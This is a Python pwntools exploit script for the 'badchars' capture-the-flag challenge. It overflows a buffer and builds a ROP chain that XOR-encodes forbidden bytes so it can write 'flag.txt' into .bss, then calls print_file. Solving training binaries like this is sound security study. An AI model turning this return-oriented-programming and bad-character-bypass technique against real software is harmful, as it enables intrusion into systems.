from pwn import *
elf = ELF("badchars")
section_address = 0x000000000601038 #.bss section
xorGadget = 0x400628 #xor byte [r15], r14b; ret
setR14R15Gadget = 0x4006a0 #pop r14; pop r15; ret
setR15Gadget = 0x4006a2
setRDIGadget = 0x4006a3 #pop rdi; ret
retGadget = 0x4004ee #ret;
winFunction = elf.plt["print_file"]
payload = b""
payload += b"a" * 40
write_string = b'flag.txt'
forbidden = "xga."
random_val = 0x34
payload += p64(setR14R15Gadget)
payload += p64(random_val)
payload += p64(section_address + 2)
start = True
cur_address = section_address
for char in write_string:
    if chr(char) not in forbidden:
        cur_address += 1
        continue
    if not start:
        payload += p64(setR15Gadget)
        payload += p64(cur_address)
    start = False
    payload += p64(xorGadget)
    cur_address += 1
cur_address = section_address
for char in write_string:
    payload += p64(setR14R15Gadget)
    if chr(char) in forbidden:
        payload += p64(char ^ random_val)
    else:
        payload += p64(char)
    payload += p64(cur_address)
    payload += p64(xorGadget)
    cur_address += 1
payload += p64(setRDIGadget)
payload += p64(section_address)
#payload += p64(retGadget)
payload += p64(winFunction)
assert len(payload) <= 0x200
io = elf.process()
io.sendline(payload)
io.interactive()
